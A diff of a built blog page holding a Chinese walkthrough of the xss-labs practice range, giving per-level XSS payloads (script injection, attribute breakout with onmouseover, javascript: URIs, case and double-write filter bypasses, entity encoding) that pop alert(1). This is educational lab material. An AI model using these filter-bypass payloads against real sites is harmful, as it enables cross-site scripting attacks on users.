@@ -1,4 +1,4 @@
-<!DOCTYPE html><html> <head><meta charset="UTF-8"><meta name="description" content="Astro description"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.1.1"><title>xss-labs 通关教程</title><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Noto+Serif+SC:wght@200;300;400;500;600;700;900&display=swap"><script>
+<!DOCTYPE html><html> <head><meta charset="UTF-8"><meta name="description" content="Astro description"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.1.1"><title>xss-labs 通关教程</title><script>
       function addMatomo() {
         var _paq = (window._paq = window._paq || []);
         _paq.push(["trackPageView"]);
@@ -23,10 +23,10 @@
         },
         { once: false }
       );
-    </script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><link rel="stylesheet" href="/_astro/about.IRO33uA2.css" />
+    </script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><link rel="stylesheet" href="/_astro/about.B43sGgpW.css" />
+<link rel="stylesheet" href="/_astro/friends.BS9m3_2e.css" />
 <style>img[data-astro-cid-4sn4zg3r]{border-radius:.25rem;--tw-shadow: 0 10px 15px -3px rgb(0 0 0 / .1), 0 4px 6px -4px rgb(0 0 0 / .1);--tw-shadow-colored: 0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000),var(--tw-ring-shadow, 0 0 #0000),var(--tw-shadow)}
-</style>
-<link rel="stylesheet" href="/_astro/friends.0bZnSjYD.css" /><script type="module" src="/_astro/hoisted.-OpaiJNX.js"></script></head> <body> <header class="mt-12 wide-container" data-astro-cid-3ef6ksr2> <h5 class="mt-4 mx-4 secondary-color sm:hidden text-center" data-astro-cid-3ef6ksr2> <a href="/" class="link">SkyWT</a> <span>
+</style><script type="module" src="/_astro/hoisted.DnddI8c6.js"></script></head> <body> <header class="mt-12 wide-container" data-astro-cid-3ef6ksr2> <h5 class="mt-4 mx-4 secondary-color sm:hidden text-center" data-astro-cid-3ef6ksr2> <a href="/" class="link">SkyWT</a> <span>
 /
 <a href="/blog" class="link"> 博客</a> </span><span>
 /
@@ -64,7 +64,7 @@ xss-labs 通关教程 </span> </h5> <div class="m-2 secondary-color" data-astro-
     () => {
       addNavObserver();
     },
-    { once: false },
+    { once: false }
   );
 
   document.addEventListener(
@@ -72,29 +72,213 @@ xss-labs 通关教程 </span> </h5> <div class="m-2 secondary-color" data-astro-
     () => {
       removeNavObserver();
     },
-    { once: false },
+    { once: false }
   );
-</script>   <main data-astro-cid-4sn4zg3r> <section class="container mt-8 sm:mt-32" data-astro-cid-4sn4zg3r>  <h1 class="primary-color leading-relaxed" data-astro-cid-4sn4zg3r>xss-labs 通关教程</h1> <p class="mt-4 secondary-color leading-relaxed" data-astro-cid-4sn4zg3r> <i class="ri-calendar-line" data-astro-cid-4sn4zg3r></i> <span data-astro-cid-4sn4zg3r>2023 年 07 月 05 日</span>   </p> <hr class="my-8" data-astro-cid-4sn4zg3r> <p class="card p-2 my-8" data-astro-cid-4sn4zg3r>
-⚙️ 全新博客前端仍在测试中。如果文章显示不正常，可以尝试访问<a href="https://blog.skywt.cn/posts/xss-labs-tutorial" class="link underline" data-astro-cid-4sn4zg3r>原博客的这篇文章</a>。
-</p> <article class="content" data-astro-cid-4sn4zg3r> <p><a href="https://github.com/do0dl3/xss-labs">xss-labs</a> 是一套基于 PHP 的 XSS 靶场，以闯关的形式让我们体验各种 XSS 漏洞利用方式。虽然已经是很多年前的了，但其中基本的 XSS 漏洞依然很有意义。</p><p>一共有 20 关，每一关的目标都是实现弹窗（<code>alert(1)</code>），如果成功就会自动进入下一关。</p><!--more--><h2>环境搭建</h2><p>克隆<a href="https://github.com/do0dl3/xss-labs">这个代码仓库</a>的代码，其中是 xss-labs 的 PHP 源文件。只要放在 PHP 环境下即可，推荐使用 XAMPP 或者 Docker。</p><p>部署完成后，访问 index.php，就可以看到入口了：</p><p><img src="https://blog.skywt.cn/usr/uploads/2023/07/700481588.png" alt="「点击图片开始你的 XSS 之旅吧」提示" title="「点击图片开始你的 XSS 之旅吧」提示"></p><h2>Warm Up</h2><p>前两关是对于 XSS 基本原理的应用，没有任何的防御。</p><h3>Level 1：文本解析为 HTML</h3><p>URL 为 <code>level1.php?name=test</code> 时，传入的参数是 test，显示的是「欢迎用户 test」。显然，这个页面会将我们传入的名字显示出来。</p><p>传入参数 <code>&lt;h1&gt;test&lt;/h1&gt;</code> 作为 <code>name</code>，发现确实显示为了一级标题。看来传入的 name 直接被作为 HTML 显示了。于是尝试传入 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> 作为 <code>name</code>，成功弹窗。</p><pre><code>?name=&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><h3>Level 2：input 标签 value 注入</h3><p>这关多了一个文本框。如果依然尝试传入 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>，会发现在 h2 元素中符号被转义了（查看网页源代码能看到），比如 <code>&lt;</code> 被转义成了 <code>&amp;lt;</code> 等，所以不会被解析成 HTML。</p><p>然而，可以看到后面的文本框 <code>input</code> 元素，其 value 值并没有被转义。</p><pre><code class="lang-html">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+</script>   <main data-astro-cid-4sn4zg3r> <section class="container mt-8 sm:mt-32" data-astro-cid-4sn4zg3r>  <h1 class="primary-color leading-relaxed" data-astro-cid-4sn4zg3r>xss-labs 通关教程</h1> <p class="mt-4 secondary-color leading-relaxed" data-astro-cid-4sn4zg3r> <i class="ri-calendar-line" data-astro-cid-4sn4zg3r></i> <span data-astro-cid-4sn4zg3r>2023 年 7 月 5 日 08:23</span> <!-- {
+          post.commentsNum > 0 && (
+            <>
+              <br />
+              <i class="ri-discuss-line" />
+              <span>共 {post.commentsNum} 条评论</span>
+            </>
+          )
+        } --> </p> <hr class="my-8" data-astro-cid-4sn4zg3r> <article class="content" data-astro-cid-4sn4zg3r> <h2><a id="文章目录" class="heading-anchor"></a>文章目录</h2>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
+<li><a href="#warm-up">Warm Up</a>
+<ul>
+<li><a href="#level-1%E6%96%87%E6%9C%AC%E8%A7%A3%E6%9E%90%E4%B8%BA-html">Level 1：文本解析为 HTML</a></li>
+<li><a href="#level-2input-%E6%A0%87%E7%AD%BE-value-%E6%B3%A8%E5%85%A5">Level 2：input 标签 value 注入</a></li>
+</ul></li>
+<li><a href="#%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87">字符过滤绕过</a>
+<ul>
+<li><a href="#level-3htmlspecialchars-%E7%9A%84%E5%BC%B1%E7%82%B9">Level 3：<code>htmlspecialchars()</code> 的弱点</a></li>
+<li><a href="#level-4%E6%B2%A1%E6%9C%89%E8%BF%87%E6%BB%A4%E5%8F%8C%E5%BC%95%E5%8F%B7">Level 4：没有过滤双引号</a></li>
+<li><a href="#level-5href-%E7%9A%84%E5%8D%B1%E9%99%A9">Level 5：href 的危险</a></li>
+<li><a href="#level-6%E5%BE%88%E8%A0%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4">Level 6：很蠢的字符过滤</a></li>
+<li><a href="#level-7%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9B%BF%E6%8D%A2%E4%BD%86%E5%8F%AA%E5%81%9A%E4%B8%80%E6%AC%A1">Level 7：字符串替换，但只做一次</a></li>
+<li><a href="#level-8uri-%E4%B8%AD%E7%9A%84%E5%AE%9E%E4%BD%93">Level 8：URI 中的实体</a></li>
+<li><a href="#level-9%E5%8D%95%E7%BA%AF%E7%9A%84%E5%BF%85%E9%A1%BB%E5%8C%85%E5%90%AB">Level 9：单纯的「必须包含」</a></li>
+</ul></li>
+<li><a href="#%E5%AD%97%E6%AE%B5%E6%B3%A8%E5%85%A5">字段注入</a>
+<ul>
+<li><a href="#level-10%E9%9A%90%E8%97%8F%E8%A1%A8%E5%8D%95%E5%AD%97%E6%AE%B5%E6%B3%A8%E5%85%A5">Level 10：隐藏表单字段注入</a></li>
+<li><a href="#level-11referer-%E6%B3%A8%E5%85%A5">Level 11：Referer 注入</a></li>
+<li><a href="#level-12ua-%E6%B3%A8%E5%85%A5">Level 12：UA 注入</a></li>
+<li><a href="#level-13cookie-%E6%B3%A8%E5%85%A5">Level 13：Cookie 注入</a></li>
+<li><a href="#level-16%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4">Level 16：空格过滤</a></li>
+</ul></li>
+<li><a href="#special">Special</a>
+<ul>
+<li><a href="#level-15angular-ng-include">Level 15：Angular <code>ng-include</code></a></li>
+</ul></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+<p><a href="https://github.com/do0dl3/xss-labs">xss-labs</a> 是一套基于 PHP 的 XSS 靶场，以闯关的形式让我们体验各种 XSS 漏洞利用方式。虽然已经是很多年前的了，但其中基本的 XSS 漏洞依然很有意义。</p>
+<p>一共有 20 关，每一关的目标都是实现弹窗（<code>alert(1)</code>），如果成功就会自动进入下一关。</p>
+<h2><a id="环境搭建" class="heading-anchor"></a>环境搭建</h2>
+<p>克隆<a href="https://github.com/do0dl3/xss-labs">这个代码仓库</a>的代码，其中是 xss-labs 的 PHP 源文件。只要放在 PHP 环境下即可，推荐使用 XAMPP 或者 Docker。</p>
+<p>部署完成后，访问 index.php，就可以看到入口了：</p>
+<p><a href="https://blog.skywt.cn/usr/uploads/2023/07/700481588.png" data-fancybox data-caption=""><img src="https://blog.skywt.cn/usr/uploads/2023/07/700481588.png" alt="「点击图片开始你的 XSS 之旅吧」提示" title="" /></a></p>
+<h2><a id="warm-up" class="heading-anchor"></a>Warm Up</h2>
+<p>前两关是对于 XSS 基本原理的应用，没有任何的防御。</p>
+<h3><a id="level-1文本解析为-html" class="heading-anchor"></a>Level 1：文本解析为 HTML</h3>
+<p>URL 为 <code>level1.php?name=test</code> 时，传入的参数是 test，显示的是「欢迎用户 test」。显然，这个页面会将我们传入的名字显示出来。</p>
+<p>传入参数 <code>&lt;h1&gt;test&lt;/h1&gt;</code> 作为 <code>name</code>，发现确实显示为了一级标题。看来传入的 name 直接被作为 HTML 显示了。于是尝试传入 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> 作为 <code>name</code>，成功弹窗。</p>
+<pre><code>?name=&lt;script&gt;alert(1);&lt;/script&gt;
+</code></pre>
+<h3><a id="level-2input-标签-value-注入" class="heading-anchor"></a>Level 2：input 标签 value 注入</h3>
+<p>这关多了一个文本框。如果依然尝试传入 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>，会发现在 h2 元素中符号被转义了（查看网页源代码能看到），比如 <code>&lt;</code> 被转义成了 <code>&amp;lt;</code> 等，所以不会被解析成 HTML。</p>
+<p>然而，可以看到后面的文本框 <code>input</code> 元素，其 value 值并没有被转义。</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(1)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>
 
-&lt;input name=keyword  value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</code></pre><p>既然如此，我们可以闭合 value 的内容的后引号，然后闭合这个 input 标签，接下来再加入我们想要注入的 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>。只需要在其之前加上 <code>&quot;&gt;</code> 即可。</p><pre><code>?keyword=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><h2>字符过滤绕过</h2><h3>Level 3：<code>htmlspecialchars()</code> 的弱点</h3><p><strong>本题要求 PHP 版本低于 8.1.0。在 8.1.0 版本中此漏洞已经修复。</strong></p><p>HTML 标准规定了一个叫做<strong>实体（Entity）</strong>的概念。在 HTML 中，<code>&lt;h1&gt;</code> 会被解释为标题标签，那我们如何以文本形式显示出 <code>&lt;h1&gt;</code> 这四个字符呢？答案是使用字符实体，将 <code>&lt;</code> 用 <code>&amp;lt;</code> 替代，将 <code>&gt;</code> 用 <code>&amp;gt;</code> 替代。在 HTML 中，如果我们写 <code>&amp;lt;h1&amp;gt;</code>，就会显示为 <code>&lt;h1&gt;</code> 而不会被解析。</p><p>在 PHP 中，后端需要渲染出一个 HTML 给前端，对传来的字符串就要进行这样的处理，将 <code>&lt;</code> 这样的字符转换为 <code>&amp;lt;</code> 这样的实体。Level 1 就是没有进行这种处理的下场。</p><p>一个通常的做法就是：使用 PHP 自带的 <code>htmlspecialchars()</code> 函数处理字符串，进行字符转义。具体用法可以参考<a href="https://www.php.net/manual/zh/function.htmlspecialchars.php">官方文档</a>。</p><p>在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>'</code>、<code>&quot;</code> 这五个字符，基本可以防范这里的 XSS 攻击。<br>但是，8.1.0 以下版本的 PHP 默认只会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code> 这四个字符，不会转义单引号 <code>'</code>。这就给这个函数带来了巨大的安全隐患。</p><p>回到这题，我们仍然尝试 <code>?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</code>，打开页面源码，观察这个 input 输入框：</p><pre><code class="lang-html">&lt;input name=keyword  value='&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'&gt;    </code></pre><p>没错，我们的字符被转义了。</p><p>然而，可以发现这里 value 的值用的是单引号。既然单引号不会被转义，我们可以闭合 value 这个字符串。</p><p>但是，<code>&lt;&gt;</code> 都会被转义，似乎不能闭合这个标签。有什么办法能够不用 <code>&lt;script&gt;</code> 标签来注入 JavaScript 代码呢？答案是使用触发器，比如 <code>onfocus</code> 或者 <code>onmouseover</code>。</p><pre><code class="lang-html">&lt;input name=keyword  value='' onmouseover=alert(1) ''&gt;</code></pre><p>所以，本题的 payload 是：</p><pre><code>?keyword=' onmouseover=javascript:alert(1) '</code></pre><h3>Level 4：没有过滤双引号</h3><p>还是先试试 <code>?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现 HTML 源码里是这样的：</p><pre><code class="lang-html">&lt;input name=keyword  value=&quot;&quot;;scriptalert(1);/script&quot;&gt;</code></pre><p>似乎代码的编写者使用了一个自定义的字符过滤函数，过滤了 <code>&lt;&gt;</code>（替换为空），但是却没有过滤 <code>&quot;</code>。使用 <code>onmouseover</code> 即可。</p><pre><code>?keyword=&quot; onmouseover=alert(1) &quot;</code></pre><h3>Level 5：href 的危险</h3><p>在这一关，当我们尝试之后发现，传入的字符串里 <code>script</code> 会被替换为 <code>scr_ipt</code>，<code>on</code> 会被替换为 <code>o_n</code>。也就是说，之前两种运行 js 脚本的办法这关里都无法使用。还有没有其他办法呢？</p><p>答案是肯定的。可以利用 JavaScript 的 URI。看看下面这个链接：</p><pre><code class="lang-html">&lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code></pre><p>不同于许多人的印象，<code>&lt;a&gt;</code> 标签的 href 值并非只能是 URL，而是 URI。<strong>URI（Uniform Resource Identifier）</strong>可以视为 URL 的超集，其不仅包含以 <code>protocol://address</code> 开头的 URL，也包含 <code>protocol:content</code> 这种形式的地址（参见 RFC 3986）。我们经常用到的有：<code>javascript:</code> 后接 js 代码，这样的 URI 打开后会运行一段 js 代码；<code>mailto:</code> 后接一个邮箱，这样的 URI 打开后会开启系统中的邮箱类应用程序，创建发送给目标地址的一封邮件。</p><p>所以，这题我们也可以利用这个运行 js 代码。</p><pre><code>?keyword=&quot;&gt; &lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code></pre><h3>Level 6：很蠢的字符过滤</h3><p>还是使用上一题的伎俩，会发现 <code>href</code> 被替换为 <code>hr_ef</code>。</p><p>事实上，这题使用了很蠢的字符过滤：区分大小写地搜索敏感词。而 HTML 并不区分大小写。所以将 href 写为 hREF 之类的即可。</p><pre><code>?keyword=&quot;&gt; &lt;a hREF=javascript:alert(1)&gt;hack&lt;/a&gt;</code></pre><h3>Level 7：字符串替换，但只做一次</h3><p>尝试过后，会发现这关里 <code>script</code> 这个字符串会被过滤，即替换为空字符串。</p><p>然而，将所有搜索到的这个字符串替换为空后，对于拼接得到的新字符串，没有再一次进行检测。这是一个非常常见的安全问题。我们只要「双写」关键词即可。例如，<code>scriscriptpt</code> 被扫描替换一次后，会变成 <code>script</code>。</p><pre><code>?keyword=&quot;&gt; &lt;scriscriptpt&gt;alert(1);&lt;/scriscriptpt&gt;</code></pre><h3>Level 8：URI 中的实体</h3><p>从这关开始，input 的 value 也严格地使用了 <code>htmlspecialchars()</code> 函数进行转义，从而无法注入。好在提供了另一个注入点：a 标签的 href 属性。</p><p>尝试之前的 <code>javascript:alert(1)</code>，发现 <code>javascript</code> 被替换成了 <code>javascr_ipt</code>：</p><pre><code class="lang-html">&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;</code></pre><p>这里要用到 href 属性的一个特性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。</p><p>HTML 实体有两种写法，第一种是之前提到的 <code>&amp;entity_name;</code> 形式，比如 <code>$lt;</code> 表示小于号；第二种是 <code>&amp;#entity_number;</code> 形式，其中 entity_number 是字符的实体编号，比如 <code>&amp;#60;</code> 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。可以使用<a href="https://mothereff.in/html-entities">这个工具</a>来转换。</p><p>对于这题，为了绕过 <code>javascript</code> 这个词的屏蔽，我们将 i 写为其字符实体 <code>&amp;#x69;</code> 即可。</p><pre><code>javascr&amp;#x69;pt:alert(1)</code></pre><h3>Level 9：单纯的「必须包含」</h3><p>如果使用上一题的 payload，会提示链接不合法。如果使用一个合法的链接，比如 <code>http://test</code>，则可以成功添加。</p><p>仅过尝试可以发现，后端只检测传入的链接字符串是否包含 <code>http://</code>，并不要求其在开头。非常弱智的检测方式（而且甚至没有考虑 https）。那么我们只要在注入的 js 代码里加上注释，里面写上 <code>http://</code> 就行了。</p><pre><code>javascr&amp;#x69;pt:alert(1)//http://</code></pre><h2>字段注入</h2><p>下面这四关和 level 2 差不多，区别只在于能够注入的字段不同。Level 2 中我们在 input 标签的 value 中注入，而下面几关分别在不同的注入点进行注入。</p><h3>Level 10：隐藏表单字段注入</h3><p>这关乍一看似乎并没有可用的注入点。其实查看源码可以看到这个隐藏的表单：</p><pre><code class="lang-html">&lt;h2 align=center&gt;没有找到和well done!相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;</code></pre><p>我们尝试请求的时候给出 <code>t_link</code>、<code>t_history</code> 和 <code>t_sort</code> 几个参数，发现 <code>t_sort</code> 的 value 字段对应其参数。举例来说，尝试这个 payload：</p><pre><code>?keyword=test?t_link=tlink&amp;t_history=thist&amp;t_sort=tsort</code></pre><p>看到 HTML 的对应部分变成了这样：</p><pre><code class="lang-html">&lt;h2 align=center&gt;没有找到和test?t_link=tlink相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;tsort&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;</code></pre><p>看来可以用 <code>t_sort</code> 的 value 这个字段来注入。</p><p>仅过尝试，对这个参数的处理上过滤了 <code>&lt;&gt;</code>，没有过滤双引号。所以我们可以直接闭合双引号，添加 <code>onmouseover</code> 属性来达到我们的目的。</p><p>但是依然有一个问题：这个元素是 hidden 的，意味着不会显示出来，不管是 focus 还是 mouseover 都不能触发。隐藏的状态是由最后的 <code>type=&quot;hidden&quot;</code> 设置的，那我们在其之前加入一个空的 <code>type</code> 就可以覆盖掉后面的设置。也就是说，注入之后的 input 会变成这样：</p><pre><code>&lt;input name=&quot;t_sort&quot; value=&quot;&quot; onmouseover=javascript:alert(1) type &quot;&quot; type=&quot;hidden&quot;&gt;</code></pre><p>Payload 如下；</p><pre><code>?keyword=test&amp;t_sort=&quot; onmouseover=javascript:alert(1) type &quot;</code></pre><h3>Level 11：Referer 注入</h3><p>如果是完成了前面一关跳转过来的，可以看到源码里的 <code>t_ref</code> 字段是跳转来的 URL（也就是请求的 Referer）：</p><pre><code class="lang-html">&lt;form id=search&gt;
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span>
+</code></pre>
+<p>既然如此，我们可以闭合 value 的内容的后引号，然后闭合这个 input 标签，接下来再加入我们想要注入的 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>。只需要在其之前加上 <code>&quot;&gt;</code> 即可。</p>
+<pre><code>?keyword=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
+</code></pre>
+<h2><a id="字符过滤绕过" class="heading-anchor"></a>字符过滤绕过</h2>
+<h3><a id="level-3htmlspecialchars-的弱点" class="heading-anchor"></a>Level 3：<code>htmlspecialchars()</code> 的弱点</h3>
+<p><strong>本题要求 PHP 版本低于 8.1.0。在 8.1.0 版本中此漏洞已经修复。</strong></p>
+<p>HTML 标准规定了一个叫做<strong>实体（Entity）</strong>的概念。在 HTML 中，<code>&lt;h1&gt;</code> 会被解释为标题标签，那我们如何以文本形式显示出 <code>&lt;h1&gt;</code> 这四个字符呢？答案是使用字符实体，将 <code>&lt;</code> 用 <code>&amp;lt;</code> 替代，将 <code>&gt;</code> 用 <code>&amp;gt;</code> 替代。在 HTML 中，如果我们写 <code>&amp;lt;h1&amp;gt;</code>，就会显示为 <code>&lt;h1&gt;</code> 而不会被解析。</p>
+<p>在 PHP 中，后端需要渲染出一个 HTML 给前端，对传来的字符串就要进行这样的处理，将 <code>&lt;</code> 这样的字符转换为 <code>&amp;lt;</code> 这样的实体。Level 1 就是没有进行这种处理的下场。</p>
+<p>一个通常的做法就是：使用 PHP 自带的 <code>htmlspecialchars()</code> 函数处理字符串，进行字符转义。具体用法可以参考<a href="https://www.php.net/manual/zh/function.htmlspecialchars.php">官方文档</a>。</p>
+<p>在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>'</code>、<code>&quot;</code> 这五个字符，基本可以防范这里的 XSS 攻击。<br>
+但是，8.1.0 以下版本的 PHP 默认只会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code> 这四个字符，不会转义单引号 <code>'</code>。这就给这个函数带来了巨大的安全隐患。</p>
+<p>回到这题，我们仍然尝试 <code>?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</code>，打开页面源码，观察这个 input 输入框：</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(1)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&#x27;</span>&gt;</span> 
+</code></pre>
+<p>没错，我们的字符被转义了。</p>
+<p>然而，可以发现这里 value 的值用的是单引号。既然单引号不会被转义，我们可以闭合 value 这个字符串。</p>
+<p>但是，<code>&lt;&gt;</code> 都会被转义，似乎不能闭合这个标签。有什么办法能够不用 <code>&lt;script&gt;</code> 标签来注入 JavaScript 代码呢？答案是使用触发器，比如 <code>onfocus</code> 或者 <code>onmouseover</code>。</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(1)</span> &#x27;&#x27;&gt;</span>
+</code></pre>
+<p>所以，本题的 payload 是：</p>
+<pre><code>?keyword=&#x27; onmouseover=javascript:alert(1) &#x27;
+</code></pre>
+<h3><a id="level-4没有过滤双引号" class="heading-anchor"></a>Level 4：没有过滤双引号</h3>
+<p>还是先试试 <code>?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现 HTML 源码里是这样的：</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-attr">scriptalert</span>(<span class="hljs-attr">1</span>);/<span class="hljs-attr">script</span>&quot;&gt;</span>
+</code></pre>
+<p>似乎代码的编写者使用了一个自定义的字符过滤函数，过滤了 <code>&lt;&gt;</code>（替换为空），但是却没有过滤 <code>&quot;</code>。使用 <code>onmouseover</code> 即可。</p>
+<pre><code>?keyword=&quot; onmouseover=alert(1) &quot;
+</code></pre>
+<h3><a id="level-5href-的危险" class="heading-anchor"></a>Level 5：href 的危险</h3>
+<p>在这一关，当我们尝试之后发现，传入的字符串里 <code>script</code> 会被替换为 <code>scr_ipt</code>，<code>on</code> 会被替换为 <code>o_n</code>。也就是说，之前两种运行 js 脚本的办法这关里都无法使用。还有没有其他办法呢？</p>
+<p>答案是肯定的。可以利用 JavaScript 的 URI。看看下面这个链接：</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+</code></pre>
+<p>不同于许多人的印象，<code>&lt;a&gt;</code> 标签的 href 值并非只能是 URL，而是 URI。<strong>URI（Uniform Resource Identifier）</strong>可以视为 URL 的超集，其不仅包含以 <code>protocol://address</code> 开头的 URL，也包含 <code>protocol:content</code> 这种形式的地址（参见 RFC 3986）。我们经常用到的有：<code>javascript:</code> 后接 js 代码，这样的 URI 打开后会运行一段 js 代码；<code>mailto:</code> 后接一个邮箱，这样的 URI 打开后会开启系统中的邮箱类应用程序，创建发送给目标地址的一封邮件。</p>
+<p>所以，这题我们也可以利用这个运行 js 代码。</p>
+<pre><code>?keyword=&quot;&gt; &lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;
+</code></pre>
+<h3><a id="level-6很蠢的字符过滤" class="heading-anchor"></a>Level 6：很蠢的字符过滤</h3>
+<p>还是使用上一题的伎俩，会发现 <code>href</code> 被替换为 <code>hr_ef</code>。</p>
+<p>事实上，这题使用了很蠢的字符过滤：区分大小写地搜索敏感词。而 HTML 并不区分大小写。所以将 href 写为 hREF 之类的即可。</p>
+<pre><code>?keyword=&quot;&gt; &lt;a hREF=javascript:alert(1)&gt;hack&lt;/a&gt;
+</code></pre>
+<h3><a id="level-7字符串替换但只做一次" class="heading-anchor"></a>Level 7：字符串替换，但只做一次</h3>
+<p>尝试过后，会发现这关里 <code>script</code> 这个字符串会被过滤，即替换为空字符串。</p>
+<p>然而，将所有搜索到的这个字符串替换为空后，对于拼接得到的新字符串，没有再一次进行检测。这是一个非常常见的安全问题。我们只要「双写」关键词即可。例如，<code>scriscriptpt</code> 被扫描替换一次后，会变成 <code>script</code>。</p>
+<pre><code>?keyword=&quot;&gt; &lt;scriscriptpt&gt;alert(1);&lt;/scriscriptpt&gt;
+</code></pre>
+<h3><a id="level-8uri-中的实体" class="heading-anchor"></a>Level 8：URI 中的实体</h3>
+<p>从这关开始，input 的 value 也严格地使用了 <code>htmlspecialchars()</code> 函数进行转义，从而无法注入。好在提供了另一个注入点：a 标签的 href 属性。</p>
+<p>尝试之前的 <code>javascript:alert(1)</code>，发现 <code>javascript</code> 被替换成了 <code>javascr_ipt</code>：</p>
+<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascr_ipt:alert(1)&quot;</span>&gt;</span>友情链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>
+</code></pre>
+<p>这里要用到 href 属性的一个特性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。</p>
